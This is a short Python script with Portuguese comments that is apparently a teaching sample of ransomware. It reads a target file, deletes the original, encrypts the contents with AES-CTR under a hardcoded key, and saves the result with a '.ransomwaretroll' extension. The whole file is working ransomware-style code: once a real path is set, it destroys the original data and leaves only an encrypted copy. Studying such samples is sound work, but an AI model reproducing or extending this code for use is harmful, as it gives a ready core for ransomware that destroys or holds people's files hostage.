import os
import pyaes

# abrir arquivo a ser criptografado
file_name = 'Caminho/para/o/arquivo/a/ser/criptografado'

if not os.path.exists(file_name):
    print(f"Arquivo {file_name} não encontrado!")
    exit(1)

file = open(file_name, 'rb')
file_data = file.read()
file.close()

# remover arquivo original
os.remove(file_name)

# definir chave de criptografia
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

# criptografar arquivo
crypto_data = aes.encrypt(file_data)

# salvar arquivo criptografado
new_file = file_name + '.ransomwaretroll'
new_file = open(new_file, 'wb')
new_file.write(crypto_data)
new_file.close()